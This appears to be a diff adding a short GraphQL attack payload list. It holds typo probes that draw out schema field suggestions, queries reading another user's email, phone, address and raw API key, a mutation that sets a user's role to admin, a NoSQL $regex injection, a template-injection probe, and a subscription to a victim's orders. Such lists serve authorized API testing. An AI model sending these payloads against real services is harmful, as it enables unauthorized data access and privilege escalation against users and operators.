@@ -1,0 +1,9 @@
+# Field suggestions leak via typo probes
+usr { id }
+users { id email }
+{ user(id: 2) { email phone address } }
+{ me { id email role isAdmin internalNote rawApiKey } }
+mutation { updateUser(id: 2, role: "admin") { success } }
+{ users(filter: {email: {"$regex": ".*"}}) { id email } }
+mutation { updateProfile(bio: "{{7*7}}") { bio } }
+subscription { orderUpdated(userId: VICTIM_ID) { status total } }
